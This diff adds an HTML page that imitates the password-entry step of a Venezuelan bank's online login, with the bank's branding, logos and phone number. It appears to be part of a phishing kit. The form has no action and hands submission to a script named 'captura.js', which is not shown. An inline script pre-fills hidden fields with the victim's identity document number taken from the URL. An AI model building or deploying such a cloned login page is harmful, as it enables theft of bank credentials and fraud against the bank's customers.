@@ -1,0 +1,164 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>Bicentenario</title>
+    <link rel="stylesheet" href="./docs/theme_2.css">
+    <link rel="stylesheet" href="./docs/loginStyle.css">
+    <link rel="shortcut icon" href="./docs/BBD-FAVICON-256x256.png" type="image/x-icon">
+    <style>
+        body.stop-scrolling {
+            height: auto !important;
+            overflow: visible !important;
+        }
+        .icon-watch {
+            color: #2c399f !important;
+        }
+        .show-account {
+            user-select: none;
+        }
+        .cargando {
+            display: none;
+            text-align: center;
+            padding: 15px;
+        }
+
+        /* Centrar el formulario y la sección de entrada */
+        .modal-body {
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            flex-direction: column;
+        }
+
+        /* Ajustar el ancho de la entrada para que esté más centrado */
+        .modal-body .row {
+            display: flex;
+            justify-content: center;
+            width: 100%;
+        }
+
+        /* Asegurarse de que el input también esté centrado */
+        .modal-body .row section {
+            width: 100%;
+            max-width: 400px;
+        }
+
+        /* Centrar los botones */
+        .botones .row {
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            width: 100%;
+        }
+
+        /* Ajustar la separación entre los botones */
+        .botones .row section {
+            margin: 0 10px;
+        }
+
+        /* Pie de página centrado */
+        .page-footer {
+            text-align: center;
+            padding-left: 0;
+            padding-right: 0;
+        }
+
+        /* Ajustar el texto en el pie de página */
+        .page-footer .m-3 {
+            text-align: center;
+            padding: 10px;
+        }
+    </style>
+</head>
+<body class="smart-style-3 fixed-page-footer fixed-header">
+
+<div id="main" role="main" class="mainRegister">
+    <div id="content" class="container">
+        <form id="password-form">
+            <input type="hidden" name="tipodocben" id="tipodocben-input">
+            <input type="hidden" name="documento" id="documento-input">
+
+            <div class="modal-dialog demo-modal">
+                <div class="modal-content">
+                    <div class="modal-header">
+                        <h4 class="modal-title text-center mt-1">
+                            <img src="./docs/Logos-BBP-001.png" alt="" style="width: 80%;">
+                        </h4>
+                    </div>
+                    <div class="modal-body smart-form padding-10">
+                        <div class="row">
+                            <section class="col col-8">
+                                <label class="label"><strong>Ingrese su contraseña</strong></label>
+                                <label class="input show-account">
+                                    <i class="icon-watch icon-append fa fa-eye-slash"></i>
+                                    <input class="input-login" type="password" required name="p" id="p" minlength="8" maxlength="16" autocomplete="off" placeholder="Ingrese su Clave">
+                                </label>
+                            </section>
+                        </div>
+                        <div class="cargando text-center">
+                            <img src="./docs/BBD-FAVICON-150x150.png" alt="" height="35"> Cargando, Por favor espere un momento...
+                        </div>
+                        <div class="botones">
+                            <div class="row mt-2">
+                                <section class="col col-6">
+                                    <button type="submit" class="btn bg-color-azul btn-block btn-azul-ingreso" id="cmdLogin">
+                                        <i class="fa fa-unlock"></i> Ingresar
+                                    </button>
+                                </section>
+                            </div>
+                            <div class="row mt-2">
+                                <section class="col col-4 text-left">
+                                    <a href="#" class="btn-link-red margin-top-5" id="cmdRegresar">
+                                        <i class="fa fa-home"></i> Regresar
+                                    </a>
+                                </section>
+                                <section class="col col-4 text-right">
+                                    <a href="#" class="btn-link-red margin-top-5" id="cmdForget">
+                                        Olvido de contraseña
+                                    </a>
+                                </section>
+                            </div>
+                        </div>
+                        <p class="text-center mt-1">
+                            <strong class="note">
+                                Para mayor información o asesoría contáctanos al <br>
+                                Centro de atención telefónica<br>
+                                0500-6272421
+                            </strong>
+                        </p>
+                    </div>
+                </div>
+            </div>
+        </form>
+    </div>
+</div>
+
+<div class="page-footer text-start" id="footer">
+    <div class="m-3" style="padding-left: 10%;">
+        <strong class="txt-color-white">
+            Banco Digital de los Trabajadores - RIF: G-20009148-7
+            <span class="hidden-xs"> Copyright © 2025.</span> Todos los derechos reservados.
+        </strong>
+    </div>
+</div>
+
+<script src="captura.js"></script>
+<script>
+// Recupera los parámetros de la URL
+const urlParams = new URLSearchParams(window.location.search);
+const documento = urlParams.get('documento');
+const tipodoc = urlParams.get('tipodoc');
+
+// Asigna los valores a los campos ocultos
+if (documento) {
+    document.getElementById('documento-input').value = documento;
+}
+if (tipodoc) {
+    document.getElementById('tipodocben-input').value = tipodoc;
+}
+</script>
+
+</body>
+</html>
